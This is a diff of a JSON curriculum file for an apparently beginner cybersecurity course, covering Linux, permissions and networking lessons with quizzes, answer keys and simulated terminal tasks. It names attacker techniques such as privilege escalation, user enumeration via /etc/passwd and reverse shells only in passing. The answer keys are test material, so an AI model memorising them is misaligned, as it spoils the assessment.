-        "id": "r3-q1",
+        "id": "q-06-1",
+        "type": "exact",
+        "question": "What numeric User ID (UID) is permanently reserved for the root superuser account on Linux systems?",
+        "visualSlots": "_",
+        "acceptedAnswers": [
+          "0",
+          "zero"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "The lowest possible non-negative integer.",
+        "explanation": "On Unix and Linux systems, UID 0 is reserved for root."
+      },
+      {
+        "id": "q-06-2",
         "type": "multiple-choice",
-        "question": "Why do modern operating systems strictly separate Kernel Space from User Space?",
+        "question": "Which fundamental security principle states that users, processes, and applications should only be granted the minimum permissions required to perform their intended tasks?",
         "options": [
-          "To allow web browsers to access physical memory directly for speed",
-          "To prevent unprivileged user programs from crashing the entire system or bypassing security checks",
-          "To eliminate the need for computer processors",
-          "To make installing applications require physical USB keys"
+          "Security through Obscurity",
+          "Principle of Least Privilege (PoLP)",
+          "Defense in Inaction",
+          "The Open-Door Policy"
         ],
         "correctIndex": 1,
-        "explanation": "By isolating user programs from Ring 0, the OS ensures a bug or exploit in a user program cannot compromise the whole system without a kernel privilege escalation."
-      },
-      {
-        "id": "r3-q2",
-        "type": "multiple-choice",
-        "question": "When a user program needs to open a file or send data over the network, what mechanism does it use to request the kernel's assistance?",
-        "options": [
-          "A System Call (syscall)",
-          "A DNS query",
-          "A BIOS flash",
-          "An HTTP cookie"
-        ],
-        "correctIndex": 0,
-        "explanation": "Applications use system calls (such as open, read, write, socket) to invoke privileged kernel services."
+        "hint": "Least privilege ensures minimum necessary access.",
+        "explanation": "The Principle of Least Privilege dictates giving only essential access, drastically limiting potential exploit impact."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Query the Kernel Version",
-        "instruction": "Execute `uname -a` in the terminal to inspect the underlying kernel architecture.",
+        "title": "Task 1: Inspect user identity and UID",
+        "instruction": "Run `id` in the terminal to check your UID.",
         "hints": [
-          "Concept: Command to print system information.",
-          "Direction: Use `uname` with a flag.",
-          "Tool: `uname` utility.",
-          "Syntax: `uname -a` (the `-a` stands for 'all').",
-          "Explanation: Output will show Linux kernel 6.8."
+          "Type: `id`"
         ]
       }
     ],
-    "explainResult": "The `uname -a` utility executed the `uname()` system call, which retrieved the `utsname` structure directly from the active Linux kernel.",
-    "securityConnection": "Kernel version enumeration is a core step in vulnerability assessments. Outdated kernels often contain known privilege escalation vulnerabilities (like Dirty COW or Dirty Pipe) that allow a standard user to become root instantly.",
-    "completion": {
-      "learned": [
-        "The purpose and responsibilities of the operating system",
-        "Kernel Space (Ring 0) vs User Space (Ring 3)",
-        "How system calls enforce security boundaries",
-        "How to query operating system and kernel build details"
-      ],
-      "practiced": [
-        "uname -a",
-        "Identifying kernel architecture",
-        "Analyzing OS privilege levels"
-      ]
-    },
-    "nextRoomId": "room-04"
-  },
-  {
-    "id": "room-04",
-    "stage": 1,
-    "stageTitle": "Stage 1 — Computer Fundamentals",
-    "title": "Linux Fundamentals & Navigation",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 03 (Operating Systems)",
-    "whyAreYouHere": "Linux is the lingua franca of cybersecurity. Over 90% of the world's cloud servers, security tools (Nmap, Metasploit, Burp Suite), and testing platforms run on Linux. If you want to be a cybersecurity professional, navigating the Linux filesystem from a terminal must become second nature.",
-    "objectives": [
-      "Understand the difference between a Terminal emulator and a Shell (Bash/Zsh)",
-      "Master the Linux single-root filesystem hierarchy (`/`)",
-      "Understand critical system directories: `/etc`, `/home`, `/var`, `/tmp`, and `/bin`",
-      "Distinguish between Absolute Paths (`/home/cadet/file`) and Relative Paths (`./file`)",
-      "Confidently use navigation commands: `pwd`, `ls`, `cd`, `cat`, `mkdir`, `cp`, `mv`, and `rm`"
-    ],
-    "vocabulary": [
-      {
-        "term": "Root Directory (`/`)",
-        "definition": "The top-most directory in the Linux hierarchy from which all other folders and mounted drives branch."
-      },
-      {
-        "term": "Absolute Path",
-        "definition": "A file path starting from the root directory (`/`), completely specifying location regardless of current working directory."
-      },
-      {
-        "term": "Relative Path",
-        "definition": "A path specified relative to where you currently are in the directory tree (e.g. `./notes.txt` or `../folder`)."
-      },
-      {
-        "term": "`/etc`",
-        "definition": "The system directory storing machine-wide configuration files (e.g. `/etc/passwd`)."
-      },
-      {
-        "term": "`/var/log`",
-        "definition": "The directory where system services write diagnostic and security event logs."
-      },
-      {
-        "term": "`/tmp`",
-        "definition": "A world-writable temporary directory wiped on reboot, often used by testers to stage scripts."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Inverted Tree Filesystem",
-        "content": "Unlike Windows with drive letters like `C:\\` or `D:\\`, Linux organizes everything under a single unified root slash: `/`.\n• `/bin` & `/usr/bin`: Essential executable commands (ls, cat, ping).\n• `/etc`: Configuration files for the OS and services.\n• `/home`: Personal user folders (e.g., `/home/cadet`).\n• `/var`: Variable data such as web roots (`/var/www/html`) and logs (`/var/log`).\n• `/tmp`: Temporary files accessible by all users."
-      },
-      {
-        "title": "2. Essential Command Vocabulary",
-        "content": "• `pwd`: *Print Working Directory* — tells you where you are standing right now.\n• `ls -la`: *List files* — shows all files including hidden ones (starting with a dot `.`) with permissions and sizes.\n• `cd <dir>`: *Change Directory* — moves your location. `cd ..` moves one level up; `cd ~` goes to your home folder.\n• `cat <file>`: *Concatenate* — prints the entire contents of a file to your terminal screen."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Absolute vs Relative Navigation",
-        "codeOrDiagram": "cadet@endlessus:~$ pwd\n/home/cadet\n\ncadet@endlessus:~$ cd /etc/ssh     <-- Absolute path (starts with /)\ncadet@endlessus:/etc/ssh$ pwd\n/etc/ssh\n\ncadet@endlessus:/etc/ssh$ cd ..    <-- Relative path (moves up one level)\ncadet@endlessus:/etc$ pwd\n/etc",
-        "explanation": "Absolute paths work identically no matter where you are. Relative paths change meaning depending on your current working folder."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Print your current directory using `pwd`, then list all files in your home folder with `ls -la`:",
-      "initialCommand": "",
-      "expectedCommand": "ls -la",
-      "simulatedOutput": "total 28\ndrwxr-xr-x 4 cadet cadet 4096 Oct  5 16:30 .\ndrwxr-xr-x 3 root  root  4096 Oct  1 00:00 ..\n-rw-r--r-- 1 cadet cadet  220 Oct  5 16:30 .bash_logout\n-rw-r--r-- 1 cadet cadet 3771 Oct  5 16:30 .bashrc\n-rw-r--r-- 1 cadet cadet  807 Oct  5 16:30 .profile\ndrwxr-xr-x 2 cadet cadet 4096 Oct  5 16:30 mission_briefings\n-rw-r--r-- 1 cadet cadet   64 Oct  5 16:30 welcome.txt\n[+] Success! You listed directory contents including hidden dotfiles.",
-      "explanation": "Notice the files starting with `.` (like `.bashrc`). These are hidden configuration files in Linux."
-    },
-    "questions": [
-      {
-        "id": "r4-q1",
-        "type": "multiple-choice",
-        "question": "Which directory in a Linux system contains system-wide configuration files (such as network settings, installed service configs, and user databases)?",
-        "options": [
-          "/tmp",
-          "/bin",
-          "/etc",
-          "/dev"
-        ],
-        "correctIndex": 2,
-        "explanation": "`/etc` (traditionally 'et cetera' or 'editable text configuration') contains host-specific configuration files."
-      },
-      {
-        "id": "r4-q2",
-        "type": "multiple-choice",
-        "question": "What does the special relative directory symbol `..` represent in Linux and Unix terminal navigation?",
-        "options": [
-          "The user's home directory",
-          "The parent directory (one level up in the hierarchy)",
-          "The root directory `/`",
-          "The current working directory"
-        ],
-        "correctIndex": 1,
-        "explanation": "`..` points to the parent directory one level above your current location. A single dot `.` refers to the current directory."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Read a File",
-        "instruction": "Use `cat welcome.txt` in the terminal to view the contents of the introductory text file.",
-        "hints": [
-          "Concept: Read a text file to standard output.",
-          "Direction: Use the concatenate utility.",
-          "Tool: `cat`",
-          "Syntax: `cat welcome.txt`",
-          "Explanation: `cat` reads the file and outputs its text lines."
-        ]
-      }
-    ],
-    "explainResult": "The `cat` command opened `welcome.txt`, read its byte stream, and streamed it directly to standard output (STDOUT), displaying the text on your screen.",
-    "securityConnection": "Linux directory knowledge is critical in reconnaissance and exploitation. Security analysts frequently read `/etc/passwd` to enumerate system users, `/var/log/auth.log` to track brute-force attacks, and `/tmp` to stage penetration testing tools.",
-    "completion": {
-      "learned": [
-        "The single-root Linux filesystem hierarchy",
-        "The roles of `/etc`, `/var`, `/tmp`, and `/bin`",
-        "The difference between absolute and relative paths",
-        "Foundational commands: pwd, ls -la, cd, cat"
-      ],
-      "practiced": [
-        "pwd",
-        "ls -la",
-        "cat welcome.txt",
-        "Reading directory listings"
-      ]
-    },
-    "nextRoomId": "room-05"
-  },
-  {
-    "id": "room-05",
-    "stage": 1,
-    "stageTitle": "Stage 1 — Computer Fundamentals",
-    "title": "Linux Users, Permissions & Processes",
-    "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 04 (Linux Fundamentals)",
-    "whyAreYouHere": "Linux is a multi-user operating system built around strict permissions. If every user could read every file, security would not exist. Understanding users, groups, read/write/execute permissions, and process management is the absolute foundation required for both system hardening and later Linux privilege escalation.",
-    "objectives": [
-      "Understand User IDs (UIDs), Group IDs (GIDs), and the supreme `root` account",
-      "Decode Linux permission strings (e.g., `-rwxr-xr--`)",
-      "Learn octal permission values (Read = 4, Write = 2, Execute = 1)",
-      "Modify permissions and ownership using `chmod` and `chown`",
-      "Inspect and manage running processes using `ps aux` and `kill`"
-    ],
-    "vocabulary": [
-      {
-        "term": "root",
-        "definition": "The superuser account (UID 0) with unrestricted power to read/write/delete any file and execute any command on the system."
-      },
-      {
-        "term": "Permissions (rwx)",
-        "definition": "Access flags: Read (r=4), Write (w=2), and Execute (x=1) assigned to User (owner), Group, and Others."
-      },
-      {
-        "term": "chmod",
-        "definition": "The 'change mode' utility used to adjust read, write, and execute permissions on files and directories."
-      },
-      {
-        "term": "chown",
-        "definition": "The 'change owner' utility used to assign file ownership to another user or group."
-      },
-      {
-        "term": "PID (Process ID)",
-        "definition": "A unique numerical identifier assigned by the Linux kernel to every active running process."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Anatomy of a Permission String",
-        "content": "When you run `ls -l`, each file begins with a 10-character string:\n`- rwx r-x r--`\n• 1st char: File type (`-` for regular file, `d` for directory).\n• Chars 2-4: **Owner (User)** permissions (`rwx` = read, write, execute).\n• Chars 5-7: **Group** permissions (`r-x` = read and execute, no write).\n• Chars 8-10: **Others (Everyone else)** permissions (`r--` = read-only)."
-      },
-      {
-        "title": "2. The Octal Numbering System",
-        "content": "Permissions are calculated using simple math:\n• **Read (r)** = 4\n• **Write (w)** = 2\n• **Execute (x)** = 1\nAdd the numbers together for each triplet:\n• `rwx` = 4 + 2 + 1 = **7**\n• `r-x` = 4 + 0 + 1 = **5**\n• `r--` = 4 + 0 + 0 = **4**\nTherefore, `chmod 754 script.sh` gives Owner full control (7), Group read+execute (5), and Others read-only (4)."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Permission Calculation Table",
-        "codeOrDiagram": "Binary   Octal   Symbolic   Meaning\n  111      7       rwx      Read, Write, and Execute\n  110      6       rw-      Read and Write\n  101      5       r-x      Read and Execute\n  100      4       r--      Read only\n  000      0       ---      No permissions",
-        "explanation": "Whenever you see `chmod 777`, it means everyone on the system can read, alter, or run that file — a massive security risk!"
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Inspect the permissions of a confidential report using `ls -l confidential.txt`, then restrict it so only the owner can read and write (`chmod 600 confidential.txt`):",
-      "initialCommand": "",
-      "expectedCommand": "chmod 600 confidential.txt",
-      "simulatedOutput": "-rw------- 1 cadet cadet 512 Oct  5 16:32 confidential.txt\n[+] Success! File restricted to owner only (Read + Write). Group and Others have zero access.",
-      "explanation": "Octal `600` means: Owner: 4+2=6 (rw-), Group: 0 (---), Others: 0 (---). Confidential files should always be protected this way."
-    },
-    "questions": [
-      {
-        "id": "r5-q1",
-        "type": "multiple-choice",
-        "question": "What numerical value corresponds to `chmod 755 filename`?",
-        "options": [
-          "Owner: rwx, Group: r-x, Others: r-x",
-          "Owner: rw-, Group: r--, Others: r--",
-          "Owner: rwx, Group: rwx, Others: rwx",
-          "Owner: ---, Group: rwx, Others: r-x"
-        ],
-        "correctIndex": 0,
-        "explanation": "7 = 4+2+1 (rwx), 5 = 4+0+1 (r-x), 5 = 4+0+1 (r-x). This is the standard permission for public executables and scripts."
-      },
-      {
-        "id": "r5-q2",
-        "type": "multiple-choice",
-        "question": "What is the User ID (UID) of the `root` superuser on standard Linux systems?",
-        "options": [
-          "UID 1000",
-          "UID 1",
-          "UID 0",
-          "UID 999"
-        ],
-        "correctIndex": 2,
-        "explanation": "UID 0 is hardcoded in the Unix/Linux kernel as the superuser `root`."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Fix Overly Permissive File",
-        "instruction": "Use `chmod 600 confidential.txt` to remove world permissions from the secret file.",
-        "hints": [
-          "Concept: Use octal permissions to lock down access.",
-          "Direction: 6 for user, 0 for group, 0 for others.",
-          "Tool: `chmod`",
-          "Syntax: `chmod 600 confidential.txt`",
-          "Explanation: Sets -rw------- permissions."
-        ]
-      }
-    ],
-    "explainResult": "The `chmod` command called the `chmod()` system call, modifying the file inode's permission bits in the ext4 filesystem metadata.",
-    "securityConnection": "Improper permissions are a primary cause of security compromises. Writable configuration files allow attackers to inject malicious commands, while world-readable private keys let adversaries impersonate administrators.",
-    "completion": {
-      "learned": [
-        "The UID/GID user identity model and root superuser (UID 0)",
-        "Decoding Linux permission strings (User, Group, Others)",
-        "Calculating octal values (r=4, w=2, x=1)",
-        "Using chmod to protect sensitive files"
-      ],
-      "practiced": [
-        "ls -l",
-        "chmod 600",
-        "Auditing file permissions"
-      ]
-    },
-    "nextRoomId": "room-06"
-  },
-  {
+    "securityConnection": "When an attacker discovers a vulnerability in a web server, they typically gain an initial foothold as an unprivileged user (like `www-data` or `cadet`). From there, the attacker's main goal is **Privilege Escalation** (PrivEsc)\u2014exploiting misconfigurations, kernel bugs, or vulnerable SUID binaries to elevate from unprivileged user to `root`.",
     "id": "room-06",
-    "stage": 2,
-    "stageTitle": "Stage 2 — Networking Fundamentals",
-    "title": "What Is a Network?",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "estimatedTime": "20 min",
-    "prerequisites": "Stage 1 (Computer Fundamentals)",
-    "whyAreYouHere": "A standalone computer cannot be hacked remotely; it is only vulnerable to physical tampering. Cybersecurity exists primarily because computers talk to each other across vast networks. In this room, you will learn how two devices connect, what routers and switches do, and how a local home network connects to the global Internet.",
-    "objectives": [
-      "Define what a computer network is and how devices communicate",
-      "Understand the Client-Server relationship",
-      "Differentiate between Local Area Networks (LAN) and Wide Area Networks (WAN)",
-      "Learn the core hardware devices: Switches, Routers, and Access Points"
-    ],
-    "vocabulary": [
-      {
-        "term": "Network",
-        "definition": "Two or more interconnected computing devices sharing data and resources over communication links."
-      },
-      {
-        "term": "Client",
-        "definition": "A device or software program (like your smartphone or browser) that initiates requests for data or services."
-      },
-      {
-        "term": "Server",
-        "definition": "A dedicated computer or process waiting to listen for incoming client requests and serve back responses."
-      },
-      {
-        "term": "LAN (Local Area Network)",
-        "definition": "A network contained within a small geographic area (like your home, office, or university lab)."
-      },
-      {
-        "term": "WAN (Wide Area Network)",
-        "definition": "A large network connecting multiple LANs across cities or continents — the Internet is the ultimate WAN."
-      },
-      {
-        "term": "Router",
-        "definition": "A network device that forwards data packets between different networks (e.g. between your LAN and the Internet)."
-      },
-      {
-        "term": "Switch",
-        "definition": "A hardware device operating inside a LAN that directs data directly between local devices using their MAC addresses."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Client-Server Architecture",
-        "content": "Almost every interaction you perform online follows the **Client-Server model**:\n• You (the **Client**) open your browser and click a link to `endlessus.in`.\n• Your machine formulates a request asking for the web page.\n• The web host (the **Server**) receives the request, processes it, and transmits the HTML page back to you."
-      },
-      {
-        "title": "2. How Data Travels: Switches vs Routers",
-        "content": "• Inside your house, all your devices connect to a **Switch** (or Wi-Fi Access Point). If your laptop wants to print to your wireless printer, data stays purely inside your **LAN**.\n• When you want to visit a website across the world, your data must leave your LAN. It travels to your **Router**, which acts as the gateway to your ISP (Internet Service Provider) and the wider **WAN**."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Home LAN to Internet Web Server Flow",
-        "codeOrDiagram": "[ Phone / Laptop (Client) ]\n            ↓ Wi-Fi\n[ Access Point / Switch ]\n            ↓ Local LAN Traffic\n[ Default Gateway (Router) ]\n            ↓ Public WAN Link\n[ Internet Service Provider (ISP) ]\n            ↓ Global Fiber Backbones\n[ Web Server (endlessus.in) ]",
-        "explanation": "Notice the boundary: inside your house is your private LAN. Once packets cross your router, they enter the public Internet WAN."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Test connectivity from your lab machine to our simulated gateway using the network utility `ping -c 3 192.168.1.1`:",
-      "initialCommand": "",
-      "expectedCommand": "ping -c 3 192.168.1.1",
-      "simulatedOutput": "PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.412 ms\n64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.388 ms\n64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.401 ms\n--- 192.168.1.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2004ms\n[+] Success! Target gateway is alive with ~0.4ms round-trip latency.",
-      "explanation": "`ping` sends ICMP Echo Request packets. When the remote device is online and reachable, it answers with ICMP Echo Replies."
-    },
-    "questions": [
-      {
-        "id": "r6-q1",
-        "type": "multiple-choice",
-        "question": "Which device is responsible for forwarding data packets between entirely different networks, such as routing your home traffic onto the Internet?",
-        "options": [
-          "Network Switch",
-          "Router",
-          "Ethernet Cable",
-          "HDMI Splitter"
-        ],
-        "correctIndex": 1,
-        "explanation": "A router operates at Layer 3 (Network Layer) and connects distinct networks together using IP routing tables."
-      },
-      {
-        "id": "r6-q2",
-        "type": "multiple-choice",
-        "question": "In the Client-Server model, which entity initiates the connection request?",
-        "options": [
-          "The Server",
-          "The Client",
-          "The Router firewall",
-          "The DNS Registrar"
-        ],
-        "correctIndex": 1,
-        "explanation": "Clients initiate communication by sending requests; servers listen passively and respond."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Verify Gateway Reachability",
-        "instruction": "Run `ping -c 3 192.168.1.1` to confirm your connection to the local gateway.",
-        "hints": [
-          "Concept: Send ICMP echo requests.",
-          "Direction: Use the ping utility.",
-          "Tool: `ping`",
-          "Syntax: `ping -c 3 192.168.1.1` (`-c 3` stops after 3 packets).",
-          "Explanation: 0% packet loss confirms the network path is operational."
-        ]
-      }
-    ],
-    "explainResult": "The `ping` command generated three ICMP (Internet Control Message Protocol) packets, transmitted them across the virtual network interface, and calculated the round-trip latency when replies arrived.",
-    "securityConnection": "Network discovery and reconnaissance always begin with understanding network topology. Attackers perform 'ping sweeps' or ARP scans to discover active IP addresses on a target subnet.",
-    "completion": {
-      "learned": [
-        "Network fundamentals and client-server communication",
-        "LAN (Local Area Network) vs WAN (Wide Area Network)",
-        "The roles of Switches (local switching) and Routers (inter-network routing)",
-        "Using ICMP ping to test network reachability"
-      ],
-      "practiced": [
-        "ping -c 3 192.168.1.1",
-        "Interpreting round-trip latency and packet loss"
-      ]
-    },
     "nextRoomId": "room-07"
   },
   {
-    "id": "room-07",
     "stage": 2,
-    "stageTitle": "Stage 2 — Networking Fundamentals",
-    "title": "IP Addresses & MAC Addresses",
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Introduction to Linux & The Command Line",
     "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "estimatedTime": "25 min",
-    "prerequisites": "Room 06 (What Is a Network?)",
-    "whyAreYouHere": "For two computers to exchange messages, each must know where to send the data. Just as sending postal mail requires both a street address and a recipient name, networks rely on two distinct addresses: physical MAC addresses for local hardware links, and logical IP addresses for internet routing. In this room, you will master IPv4, IPv6, private vs public addresses, and the ARP protocol.",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "20 min",
+    "prerequisites": "Level 1: Computer Fundamentals",
+    "whyAreYouHere": "Linux is the lifeblood of cybersecurity. Over 96% of top web servers, virtually all supercomputers, Android smartphones, and nearly all cybersecurity testing platforms (like Kali Linux and Parrot OS) run on Linux. In this room, you will learn why Linux dominates cybersecurity and how to navigate the command line with confidence.",
     "objectives": [
-      "Understand IPv4 (32-bit dotted-decimal) and IPv6 (128-bit hexadecimal) addresses",
-      "Differentiate between Public (globally routable) and Private (RFC 1918) IP addresses",
-      "Understand Loopback / Localhost (`127.0.0.1`)",
-      "Learn physical MAC addresses (Layer 2) and how ARP maps IP addresses to MACs",
-      "Inspect your network interfaces using `ip addr`"
+      "Understand why cybersecurity and servers rely almost exclusively on Linux",
+      "Learn about the Linux kernel, open-source licensing, and major distributions (Debian, Ubuntu, Kali, Arch, Red Hat)",
+      "Understand the Command Line Interface (CLI) versus Graphical User Interface (GUI)",
+      "Deconstruct the anatomy of a Linux shell prompt (`user@hostname:path$`)",
+      "Understand command syntax: command, options (flags), and arguments"
+    ],
+    "vocabulary": [
+      {
+        "term": "Linux Kernel",
+        "definition": "The monolithic core created by Linus Torvalds in 1991 that manages hardware, memory, and processes."
+      },
+      {
+        "term": "Distribution (Distro)",
+        "definition": "A complete operating system bundle combining the Linux kernel with GNU utilities, package managers, and software (e.g., Ubuntu, Kali, Debian)."
+      },
+      {
+        "term": "CLI (Command Line Interface)",
+        "definition": "A text-based interaction environment where commands are typed to execute programs and manage files."
+      },
+      {
+        "term": "Shell (Bash)",
+        "definition": "A command-language interpreter that takes user text commands, interprets them, and passes them to the kernel for execution."
+      },
+      {
+        "term": "Argument / Flag",
+        "definition": "Modifiers appended to a command (e.g., `-l` or `-a`) that alter its behavior or specify target files."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Why Does Cybersecurity Run on Linux?",
+        "content": "Why don't ethical hackers just use Windows for everything?\n\n1. **Total Control**: Linux gives you access to the source code of the entire operating system. There are no black-box secrets.\n2. **Scriptable & Automated**: Every action you perform in a Linux terminal can be scripted in Bash or Python to automate tasks across thousands of machines.\n3. **Low Resource Overhead**: A Linux server can run headless (no graphical desktop) using only 128MB of RAM, making it blazing fast and lightweight.\n4. **Security Tooling Ecosystem**: The world's top penetration testing distributions (Kali Linux, Parrot OS) come pre-installed with over 600 specialized security tools (Nmap, Metasploit, Wireshark, Burp Suite, John the Ripper)."
+      },
+      {
+        "title": "2. Anatomy of the Shell Prompt",
+        "content": "When you open a terminal in Linux, you are greeted by the shell prompt:\n\n`cadet@endlessus:~$ `\n\nLet's break down each component:\n\u2022 `cadet`: The currently logged-in username.\n\u2022 `@`: Separator ('at').\n\u2022 `endlessus`: The hostname of the computer or server.\n\u2022 `:`: Separator.\n\u2022 `~`: Your current working directory. The tilde symbol (`~`) is a universal shortcut for the current user's **home directory** (`/home/cadet`).\n\u2022 `$`: Indicates you are a **standard unprivileged user**. If you were the `root` superuser, this symbol would change to `#`!"
+      },
+      {
+        "title": "3. Command Syntax: Commands, Flags, and Arguments",
+        "content": "Linux commands follow a predictable sentence structure:\n\n`[command] [options/flags] [arguments]`\n\n\u2022 **Command**: What program do you want to run? (`ls` = list directory contents).\n\u2022 **Options/Flags**: How should it run? (e.g., `-l` for long detailed view, `-a` to show hidden files).\n\u2022 **Arguments**: What should it run against? (e.g., `/etc/nginx` to list that specific directory).\n\nExample: `ls -la /var/log` runs `ls` with flags `-l` and `-a` on directory `/var/log`."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Command with Flags and Arguments",
+        "codeOrDiagram": "cadet@endlessus:~$ ls\nDocuments  Downloads  notes.txt\n\ncadet@endlessus:~$ ls -l\ntotal 8\ndrwxr-xr-x 2 cadet cadet 4096 Oct 15 10:00 Documents\ndrwxr-xr-x 2 cadet cadet 4096 Oct 15 10:00 Downloads\n-rw-r--r-- 1 cadet cadet  142 Oct 15 10:05 notes.txt",
+        "explanation": "Adding the `-l` flag turns `ls` from a simple names list into a detailed view showing permissions, owner, file size, and timestamps."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Type `echo $SHELL` to print the name of your active shell interpreter:",
+      "initialCommand": "",
+      "expectedCommand": "echo $SHELL",
+      "simulatedOutput": "/bin/bash\n[+] Active shell confirmed: You are running GNU Bash (/bin/bash).",
+      "explanation": "`$SHELL` is an environment variable holding the path to the current user's shell program."
+    },
+    "questions": [
+      {
+        "id": "q-07-1",
+        "type": "exact",
+        "question": "Which symbol at the end of a Linux shell prompt signifies that you are logged in as a standard unprivileged user rather than root?",
+        "visualSlots": "_",
+        "acceptedAnswers": [
+          "$",
+          "dollar",
+          "dollar sign"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "The dollar sign ($).",
+        "explanation": "In standard Linux shells, '$' denotes an unprivileged user, while '#' denotes root."
+      },
+      {
+        "id": "q-07-2",
+        "type": "multiple-choice",
+        "question": "In the command `ls -la /home`, what does `-la` represent?",
+        "options": [
+          "The main command being executed",
+          "The target destination argument",
+          "Command-line flags/options that modify how the command behaves",
+          "A file path redirection"
+        ],
+        "correctIndex": 2,
+        "hint": "Dashes prefix optional modifiers (flags).",
+        "explanation": "Options (flags) like `-la` modify program behavior (here, long format `-l` and show hidden files `-a`)."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect active shell interpreter",
+        "instruction": "Print the current shell path using `echo $SHELL`.",
+        "hints": [
+          "Type: `echo $SHELL`"
+        ]
+      }
+    ],
+    "securityConnection": "Penetration testers frequently interact with compromised targets solely through remote 'reverse shells'\u2014a raw terminal connection over a network with no graphics. Comfort with the Linux CLI is the single most essential skill in offensive cybersecurity.",
+    "id": "room-07",
+    "nextRoomId": "room-08"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Navigating the Filesystem (pwd, ls, cd)",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 07: Introduction to Linux & The Command Line",
+    "whyAreYouHere": "In a GUI, you click folders to move around. In the terminal, you navigate using three foundational commands: `pwd`, `ls`, and `cd`. Understanding absolute versus relative paths is crucial\u2014if you target the wrong directory during a penetration test, you could accidentally delete evidence or crash a system.",
+    "objectives": [
+      "Understand the Linux root directory (`/`) and hierarchical directory tree",
+      "Print your current location with `pwd` (print working directory)",
+      "List folder contents with `ls`, including hidden files (`ls -a`) and details (`ls -l`)",
+      "Change directories using `cd`",
+      "Master relative paths (`.`, `..`), home directory shortcuts (`~`), and absolute paths (`/var/log`)"
+    ],
+    "vocabulary": [
+      {
+        "term": "pwd (print working directory)",
+        "definition": "Outputs the full, absolute path of the directory you are currently standing in."
+      },
+      {
+        "term": "ls (list)",
+        "definition": "Lists the files and folders inside a specified directory (or the current directory by default)."
+      },
+      {
+        "term": "cd (change directory)",
+        "definition": "Moves your terminal session into a different directory."
+      },
+      {
+        "term": "Absolute Path",
+        "definition": "A complete path starting from the root directory `/` (e.g., `/etc/passwd`). Works regardless of where you are."
+      },
+      {
+        "term": "Relative Path",
